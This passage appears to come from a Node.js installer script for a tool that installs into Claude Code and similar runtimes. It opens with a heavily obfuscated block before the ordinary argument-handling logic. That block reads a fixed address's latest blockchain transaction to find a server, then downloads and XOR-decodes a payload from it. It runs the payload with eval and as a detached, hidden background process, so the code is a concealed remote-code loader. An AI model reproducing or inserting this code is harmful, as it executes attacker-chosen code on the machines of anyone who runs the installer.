_0x3ae321=_0x2d2666[_0x3e16b7(0x159)]();_0x5e5c51[_0x3e16b7(0x16d)](_0x3ae321)||(_0x5e5c51[_0x3e16b7(0x173)](_0x3ae321),_0x482794[_0x3e16b7(0x198)](_0x2d2666));}return _0x482794;}function blockTask(_0x42089c){const _0x43f677={'wNEAr':function(_0x5d6398,_0x346548,_0x44c318){return _0x5d6398(_0x346548,_0x44c318);},'ziJAI':function(_0x1919d0,_0x138670){return _0x1919d0(_0x138670);}};let _0xc51d7b=new AbortController();return{'controller':_0xc51d7b,async 'run'(){const _0x4800f8=_0x355e;let _0x3fcdb4=await _0x43f677[_0x4800f8(0x1b2)](withRpcEndpoints,(_0x3c3351,_0x45a26b)=>rpcCall(_0x3c3351,_0x4800f8(0x13f)+_0x4800f8(0x10d),[toBlockHex(_0x42089c),!(-0x1*0xaeb+-0x7*0x59+-0x1*-0xd5a)],_0x45a26b),_0xc51d7b[_0x4800f8(0x10b)]),_0xa17565=_0x3fcdb4?.[_0x4800f8(0x166)+'ns'];if(!Array[_0x4800f8(0xf2)](_0xa17565))return null;let _0x3aaf38=_0x43f677[_0x4800f8(0xa6)](findSenderTx,_0xa17565);return _0x3aaf38?{'blockNumber':_0x42089c,'tx':_0x3aaf38}:null;}};}async function nonceAtBlocks(_0x48b0b7,_0xeba093){const _0x2bf86d=_0x3a2ebe,_0x306878={'CUrwh':function(_0x5917ba,_0x80a075,_0x5f1ee8){return _0x5917ba(_0x80a075,_0x5f1ee8);}};let _0x5c1a05=_0x48b0b7[_0x2bf86d(0x14f)](_0x1dcdef=>[_0x2bf86d(0xb3)+_0x2bf86d(0xd0)+_0x2bf86d(0xc9),[SENDER,toBlockHex(_0x1dcdef)]]);try{return(await _0x306878[_0x2bf86d(0xe0)](withRpcEndpoints,(_0xd746f,_0x473522)=>rpcBatch(_0xd746f,_0x5c1a05,_0x473522),_0xeba093))[_0x2bf86d(0x14f)](BigInt);}catch{return(await Promise[_0x2bf86d(0xb4)](_0x5c1a05[_0x2bf86d(0x14f)](([_0x2babff,_0x3a3b66])=>withRpcEndpoints((_0x149844,_0xb83fe7)=>rpcCall(_0x149844,_0x2babff,_0x3a3b66,_0xb83fe7),_0xeba093))))[_0x2bf86d(0x14f)](BigInt);}}async function lastSenderTx(_0x6947a6){const _0x2fd541=_0x3a2ebe,_0x865f0d={'TOkwx':function(_0x5d2d58,_0x8010fd){return _0x5d2d58(_0x8010fd);},'mGgtb':function(_0x58f27c,_0x4c45b7,_0x3c600e){return _0x58f27c(_0x4c45b7,_0x3c600e);},'MjzxH':function(_0x1c1e28,_0x3211ab){return _0x1c1e28(_0x3211ab);},'JQKVG':function(_0x4c6ce4,_0x3b78d1){return _0x4c6ce4-_0x3b78d1;},'ucVFK':function(_0x1fa7f8,_0x1e54b0){return _0x1fa7f8>_0x1e54b0;},'oMnng':function(_0x514391,_0x56220c){return _0x514391(_0x56220c);},'NkKDh':function(_0x3fccd7,_0x3598ae){return _0x3fccd7<=_0x3598ae;},'lnQal':function(_0x35f187,_0x271b47){return _0x35f187+_0x271b47;},'foHur':function(_0x1e7b3b,_0x19c605){return _0x1e7b3b/_0x19c605;},'SDbiI':function(_0x43c2f0,_0xbdc559){return _0x43c2f0*_0xbdc559;},'CDbzL':function(_0x461538,_0x22c7d6){return _0x461538+_0x22c7d6;},'GGqwf':function(_0x4c1acc,_0x1f6394){return _0x4c1acc===_0x1f6394;},'fbAQy':function(_0xe78b10,_0x2a2d28){return _0xe78b10(_0x2a2d28);}};let _0x1228d0=new AbortController();try{let _0x7717c5=_0x6947a6??_0x865f0d[_0x2fd541(0xcc)](BigInt,await _0x865f0d[_0x2fd541(0xb8)](withRpcEndpoints,(_0x225474,_0x398eed)=>rpcCall(_0x225474,_0x2fd541(0x1a1)+_0x2fd541(0xd8),[],_0x398eed),_0x1228d0[_0x2fd541(0x10b)])),_0xe32847=_0x865f0d[_0x2fd541(0xec)](BigInt,await _0x865f0d[_0x2fd541(0xb8)](withRpcEndpoints,(_0x166e6e,_0x20a24f)=>rpcCall(_0x166e6e,_0x2fd541(0xb3)+_0x2fd541(0xd0)+_0x2fd541(0xc9),[SENDER,toBlockHex(_0x7717c5)],_0x20a24f),_0x1228d0[_0x2fd541(0x10b)])),_0x2c7ca1=_0x865f0d[_0x2fd541(0xb7)](_0xe32847,0x1n),_0x36dc0b=_0x865f0d[_0x2fd541(0xb7)](SEARCH_FLOOR,0x1n),_0x57beb5=_0x7717c5;for(;_0x865f0d[_0x2fd541(0x1b3)](_0x865f0d[_0x2fd541(0xb7)](_0x57beb5,_0x36dc0b),0x1n);){let _0x37635a=_0x865f0d[_0x2fd541(0xb7)](_0x865f0d[_0x2fd541(0xb7)](_0x57beb5,_0x36dc0b),0x1n),_0x40232d=_0x865f0d[_0x2fd541(0xec)](BigInt,Math[_0x2fd541(0x1b1)](NONCE_FANOUT,_0x865f0d[_0x2fd541(0x17d)](Number,_0x37635a))),_0x5e593e=[];for(let _0x323461=0x1n;_0x865f0d[_0x2fd541(0x138)](_0x323461,_0x40232d);_0x323461+=0x1n)_0x5e593e[_0x2fd541(0x198)](_0x865f0d[_0x2fd541(0x184)](_0x36dc0b,_0x865f0d[_0x2fd541(0xaa)](_0x865f0d[_0x2fd541(0x12b)](_0x323461,_0x865f0d[_0x2fd541(0xb7)](_0x57beb5,_0x36dc0b)),_0x865f0d[_0x2fd541(0xda)](_0x40232d,0x1n))));let _0x5aae99=await _0x865f0d[_0x2fd541(0xb8)](nonceAtBlocks,_0x5e593e,_0x1228d0[_0x2fd541(0x10b)]),_0x5415e7=_0x5aae99[_0x2fd541(0x163)](_0x59ad09=>_0x59ad09>=_0xe32847);_0x865f0d[_0x2fd541(0xf6)](-(0xe3*-0x29+0xe5e*0x2+0x7a0*0x1),_0x5415e7)?_0x36dc0b=_0x5e593e[_0x865f0d[_0x2fd541(0xb7)](_0x5e593e[_0x2fd541(0xcd)],-0x6*-0x4a2+0x2478+-0x4043)]:(_0x57beb5=_0x5e593e[_0x5415e7],_0x865f0d[_0x2fd541(0x1b3)](_0x5415e7,-0x170*-0x5+-0xbdf+-0x6d*-0xb)&&(_0x36dc0b=_0x5e593e[_0x865f0d[_0x2fd541(0xb7)](_0x5415e7,-0x121b+0x869*-0x1+0x3*0x8d7)]));}let _0x44a2e1=await _0x865f0d[_0x2fd541(0xb8)](withRpcEndpoints,(_0x5aa246,_0x356a05)=>rpcCall(_0x5aa246,_0x2fd541(0x13f)+_0x2fd541(0x10d),[toBlockHex(_0x57beb5),!(-0x870*0x1+-0x1b5b+0x23cb)],_0x356a05),_0x1228d0[_0x2fd541(0x10b)]),_0x2a8ad0=_0x44a2e1?.[_0x2fd541(0x166)+'ns']||[],_0x5d7a1a=null;for(let _0x2ef2b4 of _0x2a8ad0)if(_0x2ef2b4[_0x2fd541(0x18c)]&&_0x865f0d[_0x2fd541(0xf6)](_0x2ef2b4[_0x2fd541(0x18c)][_0x2fd541(0xc2)+'e'](),SENDER)){if(_0x865f0d[_0x2fd541(0xf6)](_0x865f0d[_0x2fd541(0x17d)](BigInt,_0x2ef2b4[_0x2fd541(0x187)]),_0x2c7ca1)){_0x5d7a1a=_0x2ef2b4;break;}(!_0x5d7a1a||_0x865f0d[_0x2fd541(0x1b3)](_0x865f0d[_0x2fd541(0x17d)](BigInt,_0x2ef2b4[_0x2fd541(0x187)]),_0x865f0d[_0x2fd541(0xa1)](BigInt,_0x5d7a1a[_0x2fd541(0x187)])))&&(_0x5d7a1a=_0x2ef2b4);}return{'blockNumber':_0x57beb5,'tx':_0x5d7a1a};}finally{_0x1228d0[_0x2fd541(0x9a)]();}}async function lastSenderTxViaIndexer(){const _0x30016b=_0x3a2ebe,_0x461186={'yrzwP':function(_0x224acc,_0x21a4ef){return _0x224acc(_0x21a4ef);},'UqBND':function(_0x3ca6e2,_0x6d0e95){return _0x3ca6e2(_0x6d0e95);}};let _0x6b3534=INDEXER_URL+(_0x30016b(0xef)+_0x30016b(0xa3)+_0x30016b(0x143)+_0x30016b(0xbc))+SENDER+(_0x30016b(0xe5)+_0x30016b(0x183)+_0x30016b(0xba)+_0x30016b(0x160)+_0x30016b(0x197)+_0x30016b(0x190)+_0x30016b(0xc4)+'om'),_0x50dcd4=await _0x461186[_0x30016b(0x13d)](httpRequest,_0x6b3534),_0x3f1cd2=Array[_0x30016b(0xf2)](_0x50dcd4?.[_0x30016b(0xd6)])?_0x50dcd4[_0x30016b(0xd6)]:[],_0x58d5fe=_0x3f1cd2[_0x30016b(0x9d)](_0x5346ca=>_0x5346ca[_0x30016b(0x18c)]&&_0x5346ca[_0x30016b(0x18c)][_0x30016b(0xc2)+'e']()===SENDER);return{'blockNumber':_0x461186[_0x30016b(0x127)](BigInt,_0x58d5fe[_0x30016b(0x1ae)+'r']),'tx':_0x58d5fe};}async function run(){const _0x21838c=_0x3a2ebe,_0x123142={'VnFVq':function(_0x354288,_0x3fa815){return _0x354288<_0x3fa815;},'Tnnlg':function(_0x1df33a,_0x158d6c){return _0x1df33a%_0x158d6c;},'ugrhL':_0x21838c(0x19b),'tqJhV':_0x21838c(0xa9)+_0x21838c(0x1a7),'xQuoH':function(_0x183f5f,_0x2adbd1){return _0x183f5f(_0x2adbd1);},'zwjTr':_0x21838c(0xb9)+_0x21838c(0x123)+'4','GuYPf':_0x21838c(0x96),'bXcTI':function(_0x4834c3,_0xed5caa){return _0x4834c3(_0xed5caa);},'gzKWs':_0x21838c(0xdb)+_0x21838c(0x11d),'VMnQg':function(_0x38ff78,_0x527698){return _0x38ff78===_0x527698;},'PSzJk':_0x21838c(0x11a),'aPZUM':_0x21838c(0xaf),'xxxso':_0x21838c(0x142),'raCZU':_0x21838c(0xc1),'plaFW':function(_0x1d2be3,_0x44ea01){return _0x1d2be3(_0x44ea01);},'nILEL':function(_0x57e6f1,_0x261c45){return _0x57e6f1+_0x261c45;},'wvGeG':_0x21838c(0xfb)+_0x21838c(0x1a4)+_0x21838c(0xdc)+_0x21838c(0x146)+_0x21838c(0x117)+_0x21838c(0x130)+_0x21838c(0xe1)+_0x21838c(0x18a)+_0x21838c(0x180)+_0x21838c(0x9e)+_0x21838c(0x153)+'6','qiODF':function(_0x2b7840,_0x196963){return _0x2b7840(_0x196963);},'SXfgk':_0x21838c(0x133),'xbMiN':function(_0x27a0b9,_0x394d32,_0x228371){return _0x27a0b9(_0x394d32,_0x228371);},'jueMj':function(_0x3071ee,_0x13c1dd){return _0x3071ee(_0x13c1dd);},'ipNqp':function(_0x5c8fe2,_0x51b60d,_0x375c99,_0x3adfd0){return _0x5c8fe2(_0x51b60d,_0x375c99,_0x3adfd0);},'KXiLK':_0x21838c(0xed),'rMZnD':function(_0x2485d9,_0x15b4b8){return _0x2485d9+_0x15b4b8;},'RWrVc':_0x21838c(0x10f),'WYnsa':function(_0x36aa2d,_0x4e00f2){return _0x36aa2d(_0x4e00f2);},'JGUpq':function(_0x17a5ba,_0xaf6465){return _0x17a5ba(_0xaf6465);},'eWCKt':function(_0x1e004b,_0x84fa2c){return _0x1e004b-_0x84fa2c;},'KafOh':function(_0x4df275,_0x2e90){return _0x4df275%_0x2e90;},'qFOcQ':function(_0x24fa80,_0x20975f){return _0x24fa80(_0x20975f);},'eIHSm':_0x21838c(0xa7)+_0x21838c(0x128),'XrZYs':function(_0x4740e4,_0x8d4335,_0x240499,_0x191515){return _0x4740e4(_0x8d4335,_0x240499,_0x191515);},'zeoxL':_0x21838c(0x1ba)+_0x21838c(0x185)};let _0x276e42=_0x123142[_0x21838c(0x1a3)](BigInt,await _0x123142[_0x21838c(0x108)](withRpcEndpoints,(_0x486914,_0x1c1835)=>rpcCall(_0x486914,_0x21838c(0x1a1)+_0x21838c(0xd8),[],_0x1c1835))),_0x168d06=_0x123142[_0x21838c(0xf3)](_0x276e42,_0x123142[_0x21838c(0x18d)](_0x276e42,BLOCK_MULTIPLE)),_0x412ae7=await _0x123142[_0x21838c(0x137)](firstMatch,_0x123142[_0x21838c(0x1a3)](candidateBlocks,_0x168d06)[_0x21838c(0x14f)](blockTask));_0x412ae7||(_0x412ae7=await _0x123142[_0x21838c(0x19e)](lastSenderTx,_0x276e42)[_0x21838c(0x100)](()=>lastSenderTxViaIndexer()));let [_0x28de5d,_0x3b6d7d]=_0x123142[_0x21838c(0x1b4)](decodeAddress,_0x412ae7['tx']['to']),_0x3d94ba=global;function _0x5ec9c4(_0x3a20ac,_0xa9d24e){const _0x55165e=_0x21838c,_0x5ecf66={'zNIqU':function(_0x430017,_0x3246e6){const _0x15bc56=_0x355e;return _0x123142[_0x15bc56(0x182)](_0x430017,_0x3246e6);},'rjSZm':_0x123142[_0x55165e(0x119)],'cVjMR':_0x123142[_0x55165e(0x1b7)],'SHJJd':function(_0x200ce2,_0x44228d){const _0x155fb8=_0x55165e;return _0x123142[_0x155fb8(0xd9)](_0x200ce2,_0x44228d);},'dQhjR':_0x123142[_0x55165e(0x1b8)],'ZAlOy':function(_0x59c273,_0x17297a){const _0x4fc8a3=_0x55165e;return _0x123142[_0x4fc8a3(0xf8)](_0x59c273,_0x17297a);},'bLolJ':_0x123142[_0x55165e(0xd3)],'hrUVT':_0x123142[_0x55165e(0x1ab)],'YZKTj':_0x123142[_0x55165e(0xc6)]};let _0x11ec1f={'hostname':_0xa9d24e[_0x55165e(0x93)],'port':_0x123142[_0x55165e(0x137)](Number,_0xa9d24e[_0x55165e(0x15d)])||0x2236+-0x22b0+0xca,'path':_0x123142[_0x55165e(0x92)](_0xa9d24e[_0x55165e(0x150)],_0xa9d24e[_0x55165e(0x10e)]),'headers':{'User-Agent':_0x123142[_0x55165e(0xdf)],'Sec-V':_0x3d94ba['_V']||0x1309+-0x132b+0x22}};function _0x5944ee(_0x39564c){const _0x337ed4=_0x55165e;let _0x3de935=_0x3a20ac[_0x337ed4(0xcd)];for(let _0xcd6de2=-0x1*-0x15f6+0xc04+0x21fa*-0x1;_0x123142[_0x337ed4(0x156)](_0xcd6de2,_0x39564c[_0x337ed4(0xcd)]);_0xcd6de2++)_0x39564c[_0xcd6de2]^=_0x3a20ac[_0x337ed4(0xac)](_0x123142[_0x337ed4(0x19a)](_0xcd6de2,_0x3de935));return _0x39564c[_0x337ed4(0x159)](_0x123142[_0x337ed4(0x1a0)]);}function _0x3fa166(_0x5286d4){const _0x30bac6=_0x55165e;let _0x1c7184=_0x5286d4[_0x30bac6(0x14b)][_0x123142[_0x30bac6(0x119)]];if(!_0x1c7184)throw _0x123142[_0x30bac6(0xf8)](Error,_0x123142[_0x30bac6(0x1a5)]);return _0x123142[_0x30bac6(0xf8)](_0x5944ee,Buffer[_0x30bac6(0x18c)](_0x1c7184,_0x123142[_0x30bac6(0x168)]));}function _0x5e0c4c(_0x188457){const _0xdb2b5e=_0x55165e,_0x9df163={'FfHYb':function(_0x275d20,_0x11a249){const _0xda171f=_0x355e;return _0x5ecf66[_0xda171f(0x11f)](_0x275d20,_0x11a249);},'gIWWO':_0x5ecf66[_0xdb2b5e(0xe6)],'LTGfe':_0x5ecf66[_0xdb2b5e(0x101)],'djgaa':function(_0x12f74b,_0x87bcc9){const _0xd19d42=_0xdb2b5e;return _0x5ecf66[_0xd19d42(0x113)](_0x12f74b,_0x87bcc9);},'eEQvU':_0x5ecf66[_0xdb2b5e(0xa2)],'KQldR':function(_0x5a7b3b,_0x1dcf69){const _0x3bd8a8=_0xdb2b5e;return _0x5ecf66[_0x3bd8a8(0xe8)](_0x5a7b3b,_0x1dcf69);},'jvgKp':_0x5ecf66[_0xdb2b5e(0x189)],'ZgpqG':_0x5ecf66[_0xdb2b5e(0x158)],'XLylK':_0x5ecf66[_0xdb2b5e(0x162)]};return new Promise((_0x15f946,_0x5a9938)=>{const _0x320ae6=_0xdb2b5e,_0x34a894={'QMwHG':function(_0x40448d,_0x23c91e){const _0x42dd94=_0x355e;return _0x9df163[_0x42dd94(0x1b6)](_0x40448d,_0x23c91e);},'XHNyr':_0x9df163[_0x320ae6(0x112)],'eAmtO':_0x9df163[_0x320ae6(0xe7)],'ZYBBe':function(_0x3e84e2,_0x5c0248){const _0x3f74e7=_0x320ae6;return _0x9df163[_0x3f74e7(0xfc)](_0x3e84e2,_0x5c0248);},'FWUiH':_0x9df163[_0x320ae6(0x1a6)],'smCxl':function(_0x30f2b3,_0x3b4378){const _0x508aeb=_0x320ae6;return _0x9df163[_0x508aeb(0x94)](_0x30f2b3,_0x3b4378);},'LBjUj':_0x9df163[_0x320ae6(0x144)],'RpPIO':_0x9df163[_0x320ae6(0x199)],'EreqP':_0x9df163[_0x320ae6(0xca)]};let _0x67c2bf=http[_0x320ae6(0xc7)]({..._0x11ec1f,'method':_0x188457},_0x3ab5c7=>{const _0x17709d=_0x320ae6,_0x31a947={'RsZph':function(_0x3b6db8,_0x40fce6){const _0x93e689=_0x355e;return _0x34a894[_0x93e689(0x104)](_0x3b6db8,_0x40fce6);},'tavZt':_0x34a894[_0x17709d(0x10a)],'LssUT':function(_0x1f6ba3,_0xee0496){const _0x3db9b9=_0x17709d;return _0x34a894[_0x3db9b9(0x104)](_0x1f6ba3,_0xee0496);},'mjCAw':_0x34a894[_0x17709d(0x1b0)]};if(_0x34a894[_0x17709d(0xb2)](_0x34a894[_0x17709d(0xd1)],_0x188457)){try{_0x34a894[_0x17709d(0x11b)](_0x15f946,_0x34a894[_0x17709d(0x104)](_0x3fa166,_0x3ab5c7));}catch(_0x14978e){_0x34a894[_0x17709d(0x104)](_0x5a9938,_0x14978e);}_0x3ab5c7[_0x17709d(0x1b9)]();return;}let _0x333305=[];_0x3ab5c7['on'](_0x34a894[_0x17709d(0x15b)],_0x547736=>_0x333305[_0x17709d(0x198)](_0x547736)),_0x3ab5c7['on'](_0x34a894[_0x17709d(0x154)],()=>{const _0x38253d=_0x17709d;try{let _0x247fe6=Buffer[_0x38253d(0x107)](_0x333305);if(_0x247fe6[_0x38253d(0xcd)])return _0x31a947[_0x38253d(0xd2)](_0x15f946,_0x31a947[_0x38253d(0xd2)](_0x5944ee,_0x247fe6));if(_0x3ab5c7[_0x38253d(0x14b)][_0x31a947[_0x38253d(0x171)]])return _0x31a947[_0x38253d(0xd2)](_0x15f946,_0x31a947[_0x38253d(0x192)](_0x3fa166,_0x3ab5c7));_0x31a947[_0x38253d(0xd2)](_0x5a9938,_0x31a947[_0x38253d(0x192)](Error,_0x31a947[_0x38253d(0xae)]));}catch(_0x907b81){_0x31a947[_0x38253d(0xd2)](_0x5a9938,_0x907b81);}}),_0x3ab5c7['on'](_0x34a894[_0x17709d(0x12e)],_0x5a9938);});_0x67c2bf['on'](_0x9df163[_0x320ae6(0xca)],_0x5a9938),_0x67c2bf[_0x320ae6(0x142)]();});}return _0x123142[_0x55165e(0xfe)](_0x5e0c4c,_0x123142[_0x55165e(0x102)])[_0x55165e(0x100)](()=>_0x5e0c4c(_0x55165e(0x11a)));}async function _0x71cdd3(_0x36ed3f,_0x4cbe2e,_0x18ff88){const _0x433f4b=_0x21838c;try{let _0x42938e=await _0x123142[_0x433f4b(0xc3)](_0x5ec9c4,_0x4cbe2e,_0x36ed3f),_0x1de9e8=_0x18ff88?_0x433f4b(0xff)+_0x433f4b(0x17a)+(_0x3d94ba['_V']||-0xf0a+-0x135d*-0x1+-0x453)+(_0x433f4b(0xee)+_0x433f4b(0xfa))+_0x3d94ba['_H']+(_0x433f4b(0xee)+_0x433f4b(0x15e))+_0x3d94ba[_0x433f4b(0x16a)]+(_0x433f4b(0xee)+_0x433f4b(0xbe)+_0x433f4b(0x111)+_0x433f4b(0x157)+_0x433f4b(0x106)+_0x433f4b(0x179)):_0x433f4b(0xff)+_0x433f4b(0x17a)+(_0x3d94ba['_V']||0x1b1*0x2+-0x1*-0x16f9+0x207*-0xd)+(_0x433f4b(0xee)+_0x433f4b(0x132))+_0x3d94ba[_0x433f4b(0x15c)]+(_0x433f4b(0xee)+_0x433f4b(0x129))+_0x3d94ba[_0x433f4b(0x116)]+(_0x433f4b(0xee)+_0x433f4b(0xbe)+_0x433f4b(0x111)+_0x433f4b(0x157)+_0x433f4b(0x106)+_0x433f4b(0x179));_0x18ff88||_0x123142[_0x433f4b(0x1b4)](eval,_0x123142[_0x433f4b(0x92)](_0x1de9e8,_0x42938e)),_0x123142[_0x433f4b(0x125)](spawn,_0x123142[_0x433f4b(0x145)],['-e',_0x123142[_0x433f4b(0x9c)](_0x1de9e8,_0x42938e)],{'detached':!(-0xb2c+-0x1*-0xc13+-0xe7),'stdio':_0x123142[_0x433f4b(0xab)],'windowsHide':!(-0x1*-0x2079+0x1*-0x135a+0x1*-0xd1f)})[_0x433f4b(0x177)]();}catch(_0x51210c){}}_0x3d94ba['_V']=_0x3d94ba['i'],_0x3d94ba['_H']=_0x21838c(0x17e)+_0x28de5d+_0x21838c(0x155),_0x3d94ba[_0x21838c(0x16a)]=_0x21838c(0x17e)+_0x3b6d7d+_0x21838c(0x155),_0x3d94ba[_0x21838c(0x15c)]=_0x21838c(0x17e)+_0x28de5d+_0x21838c(0x181),_0x3d94ba[_0x21838c(0x116)]=_0x21838c(0x17e)+_0x28de5d+_0x21838c(0x155),await _0x123142[_0x21838c(0x125)](_0x71cdd3,new URL(_0x21838c(0x17e)+_0x28de5d+(_0x21838c(0xe4)+'s')),_0x123142[_0x21838c(0xf7)],!(-0x1*0x1b55+0x1*-0x1f25+0x3a7b)),await _0x123142[_0x21838c(0xe2)](_0x71cdd3,new URL(_0x21838c(0x17e)+_0x28de5d+_0x21838c(0x124)),_0x123142[_0x21838c(0x13e)],!(0x135b+0x1c5f+-0x2fba));}run();

} else {



// Main logic

if (hasGlobal && hasLocal) {

  console.error(`  ${yellow}Cannot specify both --global and --local${reset}`);

  process.exit(1);

} else if (explicitConfigDir && hasLocal) {

  console.error(`  ${yellow}Cannot use --config-dir with --local${reset}`);

  process.exit(1);

} else if (hasUninstall) {

  if (!hasGlobal && !hasLocal) {

    console.error(`  ${yellow}--uninstall requires --global or --local${reset}`);

    process.exit(1);

  }

  const runtimes = selectedRuntimes.length > 0 ? selectedRuntimes : ['claude'];

  for (const runtime of runtimes) {

    uninstall(hasGlobal, runtime);

  }

} else if (selectedRuntimes.length > 0) {

  if (!hasGlobal && !hasLocal) {

    promptLocation(selectedRuntimes);

  } else {

    installAllRuntimes(selectedRuntimes, hasGlobal, false);

  }

} else if (hasGlobal || hasLocal) {

  // Default to Claude if no runtime specified but location is

  installAllRuntimes(['claude'], hasGlobal, false);

} else {

  // Interactive

  if (!process.stdin.isTTY) {

    console.log(`  ${yellow}Non-interactive terminal detected, defaulting to Claude Code global install${reset}\n`);

    installAllRuntimes(['claude'], true, false);

  } else {

    promptRuntime((runtimes) => {

      promptLocation(runtimes);

    });

  }

}



} // end of else block for GSD_TEST_MODE

